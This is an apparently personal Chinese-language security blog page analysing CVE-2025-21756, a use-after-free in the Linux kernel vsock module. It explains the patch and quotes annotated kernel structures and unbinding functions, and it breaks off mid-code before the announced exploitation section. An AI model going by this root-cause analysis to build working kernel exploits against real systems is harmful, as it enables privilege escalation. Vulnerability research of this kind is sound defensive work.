<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="henry">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/06/13/cve-2025-21756/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="CVE-2025-21756https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2025-21756  为漏洞相关描述信息，该漏洞位于 vsock 模块下，原因为transport（实际执行数据传输逻辑的后端实现接口集）在重新分配时解除绑定导致 UAF。本篇文章重点在于详细分析漏洞触发原因，漏洞利用部分参考exploit ，同时也会说明一下笔者在实际利用测试过程中遇到的一些问">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-21756 漏洞复现及利用">
<meta property="og:url" content="http://example.com/2025/06/13/CVE-2025-21756/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CVE-2025-21756https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2025-21756  为漏洞相关描述信息，该漏洞位于 vsock 模块下，原因为transport（实际执行数据传输逻辑的后端实现接口集）在重新分配时解除绑定导致 UAF。本篇文章重点在于详细分析漏洞触发原因，漏洞利用部分参考exploit ，同时也会说明一下笔者在实际利用测试过程中遇到的一些问">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_02-21-55.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_02-27-21.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_00-16-35.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-02-20.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-09-02.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-03-08.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-28-15.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-09-28.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-53-10.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_03-54-21.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-17-10.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-18-36.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-46-58.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-48-33.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_19-15-44.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_02-19-30.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-06_04-56-27.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_13-35-37.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_14-17-51.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_14-08-23.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_14-39-53.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_15-06-41.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_15-07-45.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_15-26-18.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_15-28-05.png">
<meta property="og:image" content="http://example.com/images/Snipaste_2025-06-12_15-33-19.png">
<meta property="article:published_time" content="2025-06-13T03:46:57.396Z">
<meta property="article:modified_time" content="2025-06-13T04:00:04.656Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="linux kernel">
<meta property="article:tag" content="vscok">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Snipaste_2025-06-06_02-21-55.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/icon.png">
    <!--- Page Info-->
    
    <title>
        
            CVE-2025-21756 漏洞复现及利用 -
        
        Henry Martin
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Henry Martin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories/"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/tags"  >
                                    
                                        
                                            <i class="fa-regular fa-tags"></i>
                                        
                                        TAGS
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/links/">LINKS
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories/"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/tags"  >
                             
                                
                                    <i class="fa-regular fa-tags"></i>
                                
                                TAGS
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/links/">LINKS</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/Snipaste_2025-06-12_15-33-19.png" alt="CVE-2025-21756 漏洞复现及利用" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">CVE-2025-21756 漏洞复现及利用</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/henry.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-06-13 11:46:57</span>
        <span class="mobile">2025-06-13 11:46:57</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-06-13 12:04</span>
            <span class="mobile">2025-06-13 12:04</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Linux/">Linux</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/Linux/kernel/">kernel</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-kernel/">linux kernel</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/vscok/">vscok</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="CVE-2025-21756"><a href="#CVE-2025-21756" class="headerlink" title="CVE-2025-21756"></a>CVE-2025-21756</h1><p><a class="link" target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-21756">https://nvd.nist.gov/vuln/detail/CVE-2025-21756 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为漏洞相关描述信息，该漏洞位于 vsock 模块下，原因为<code>transport</code>（实际执行数据传输逻辑的后端实现接口集）在重新分配时解除绑定导致 UAF。本篇文章重点在于详细分析漏洞触发原因，漏洞利用部分参考<a class="link" target="_blank" rel="noopener" href="https://hoefler.dev/articles/vsock.html">exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，同时也会说明一下笔者在实际利用测试过程中遇到的一些问题。</p>
<h2 id="Vsock"><a href="#Vsock" class="headerlink" title="Vsock"></a>Vsock</h2><p><strong>VSOCK（Virtual Socket）</strong> 是一种专为<strong>虚拟机（VM）与宿主机之间高效通信</strong>设计的套接字协议，由 VMware 最初提出并集成到 Linux 内核中。它允许虚拟机内的应用程序直接与宿主机或其他虚拟机通信，<strong>无需经过传统网络协议栈（如 TCP/IP）</strong>，从而提供更低延迟和更高吞吐量。</p>
<p><strong>VSOCK 的典型应用场景</strong></p>
<p><strong>(1) 宿主机-虚拟机通信</strong></p>
<ul>
<li><strong>示例</strong>：宿主机上的监控工具直接读取虚拟机内的日志。</li>
<li><strong>优势</strong>：无需配置虚拟网络（如桥接、NAT），避免网络带宽竞争。</li>
</ul>
<p><strong>(2) 虚拟机间通信</strong></p>
<ul>
<li><strong>示例</strong>：同一宿主机上的两个 Kubernetes Pod（运行在不同 VM 中）通过 VSOCK 交换数据。</li>
<li><strong>优势</strong>：比 overlay 网络（如 Flannel、Calico）更高效。</li>
</ul>
<p><strong>(3) 嵌套虚拟化</strong></p>
<ul>
<li>在嵌套虚拟化环境中（如 VM 内再运行 VM），VSOCK 可跨多层虚拟化通信。</li>
</ul>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>Linux kernel 对应的 commit <a class="link" target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=3f43540166128951cc1be7ab1ce6b7f05c670d8b"> 3f43540166128951cc1be7ab1ce6b7f05c670d8b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_02-21-55.png" alt="nipaste_2025-06-06_02-21-5"></p>
<p><strong>新增条件判断 <code>SOCK_DEAD</code></strong></p>
<ul>
<li><p>只有套接字标记为 <code>SOCK_DEAD</code>（表示已关闭或不可用）时，才从绑定表（<code>vsock_bound_sockets</code>）移除。</p>
</li>
<li><p>避免在传输层切换（<code>transport reassignment</code>）时误删绑定。</p>
</li>
</ul>
<p><strong>保留 <code>vsock_remove_connected(vsk)</code></strong></p>
<ul>
<li>连接表（<code>vsock_connected_sockets</code>）的移除逻辑不变，因为连接状态与传输层无关。</li>
</ul>
<p><strong>将<code>sock_orphan</code> 提前，目的是提前将<code>sk</code>状态设置为<code>SOCK_DEAD</code></strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_02-27-21.png" alt="nipaste_2025-06-06_02-27-2"></p>
<h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><h3 id="Struct-info"><a href="#Struct-info" class="headerlink" title="Struct info"></a>Struct info</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Address structure for vSockets.   The address family should be set to</span></span><br><span class="line"><span class="comment"> * AF_VSOCK.  The structure members should all align on their natural</span></span><br><span class="line"><span class="comment"> * boundaries without resorting to compiler packing directives.  The total size</span></span><br><span class="line"><span class="comment"> * of this structure should be exactly the same as that of struct sockaddr.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> {</span></span><br><span class="line">    <span class="type">__kernel_sa_family_t</span> svm_family;  <span class="comment">// 地址族，必须设置为 AF_VSOCK</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> svm_reserved1;     <span class="comment">// 保留字段，目前未使用</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> svm_port;            <span class="comment">// 端口号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> svm_cid;             <span class="comment">// 上下文ID（Context ID）</span></span><br><span class="line">    __u8 svm_flags;                   <span class="comment">// 标志位 每个 VM 保留一个 cid</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> svm_zero[<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr) - </span><br><span class="line">                          <span class="keyword">sizeof</span>(<span class="type">sa_family_t</span>) - </span><br><span class="line">                          <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span>) - </span><br><span class="line">                          <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) - </span><br><span class="line">                          <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) - </span><br><span class="line">                          <span class="keyword">sizeof</span>(__u8)];  <span class="comment">// 填充字段，确保与 sockaddr 大小一致</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_VM_SOCKETS_GET_LOCAL_CID		_IO(7, 0xb9)</span></span><br></pre></td></tr></table></figure></div>



<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>关于 vsock 的相关操作介绍内容如下</p>
<ul>
<li><strong><code>bind()</code> 显式绑定</strong>：用户调用 <code>bind()</code> 时，套接字会被加入 <code>vsock_bound_sockets</code> 列表。</li>
<li><strong><code>connect()</code> 隐式绑定（autobind）</strong>：如果未显式 <code>bind()</code>，<code>connect()</code> 会自动绑定一个随机端口。</li>
</ul>
<p><strong>1. <code>vsock_remove_bound(vsk)</code></strong></p>
<p><strong>作用</strong></p>
<ul>
<li><strong>移除套接字的绑定信息</strong>（从 <code>vsock_bound_sockets</code> 列表中删除）。</li>
<li>通常在以下情况调用：<ul>
<li>套接字显式调用 <code>bind()</code> 后又被关闭（<code>close()</code>）。</li>
<li>套接字隐式绑定（<code>autobind</code>）后被释放。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vsock_remove_bound</span><span class="params">(<span class="keyword">struct</span> vsock_sock *vsk)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!list_empty(&amp;vsk-&gt;bound_table)) {</span><br><span class="line">        list_del_init(&amp;vsk-&gt;bound_table);  <span class="comment">// 从绑定列表移除</span></span><br><span class="line">        sock_put(&amp;vsk-&gt;sk);                <span class="comment">// 减少引用计数（refcnt--）</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>list_del_init(&amp;vsk-&gt;bound_table)</code></strong><br>如果 <code>vsk</code> 在 <code>vsock_bound_sockets</code> 列表（即已绑定），则移除它。</li>
<li><strong><code>sock_put(&amp;vsk-&gt;sk)</code></strong><br>减少套接字的引用计数（<code>refcnt</code>），如果 <code>refcnt=0</code>，则释放套接字。</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>当 <code>vsock</code> 套接字关闭（<code>release</code>）或重新绑定（<code>rebind</code>）时调用。</li>
<li><strong>问题修复前</strong>：<br>如果 <code>transport</code> 重新赋值（如 <code>connect()</code> 时切换传输层），错误调用 <code>vsock_remove_bound()</code> 可能导致 <strong>UAF</strong>（因为 <code>vsk</code> 可能未真正绑定）。</li>
</ul>
<p><strong>2. <code>vsock_remove_connected(vsk)</code></strong></p>
<ul>
<li><strong>移除套接字的连接信息</strong>（从 <code>vsock_connected_sockets</code> 列表中删除）。</li>
<li>通常在以下情况调用：<ul>
<li>套接字已建立连接（<code>connect()</code>/<code>accept()</code>）后被关闭。</li>
<li>传输层（<code>transport</code>）释放时（如 <code>virtio-vsock</code> 断开连接）。</li>
</ul>
</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vsock_remove_connected</span><span class="params">(<span class="keyword">struct</span> vsock_sock *vsk)</span></span><br><span class="line">{</span><br><span class="line">    list_del_init(&amp;vsk-&gt;connected_table);  <span class="comment">// 从连接列表移除</span></span><br><span class="line">    sock_put(&amp;vsk-&gt;sk);                    <span class="comment">// 减少引用计数（refcnt--）</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>list_del_init(&amp;vsk-&gt;connected_table)</code></strong><br>如果 <code>vsk</code> 在 <code>vsock_connected_sockets</code> 列表（即已连接），则移除它。</li>
<li><strong><code>sock_put(&amp;vsk-&gt;sk)</code></strong><br>减少引用计数，可能触发套接字释放。</li>
</ul>
<p>这里具体说一下 <code>vsk-&gt;bound_table</code> 在实际进行绑定操作时，需要先通过<code>vsk-&gt;local_addr</code>计算出哈希值，然后存储到对应<code>hash table</code>的<code>bucket</code> 当中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__vsock_remove_bound(vsk);</span><br><span class="line">__vsock_insert_bound(vsock_bound_sockets(&amp;vsk-&gt;local_addr), vsk);</span><br></pre></td></tr></table></figure></div>

<p>相关宏定义如下，同时注释信息也详细解释了相关实现逻辑，不再过多说明</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Each bound VSocket is stored in the bind hash table and each connected</span></span><br><span class="line"><span class="comment"> * VSocket is stored in the connected hash table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unbound sockets are all put on the same list attached to the end of the hash</span></span><br><span class="line"><span class="comment"> * table (vsock_unbound_sockets).  Bound sockets are added to the hash table in</span></span><br><span 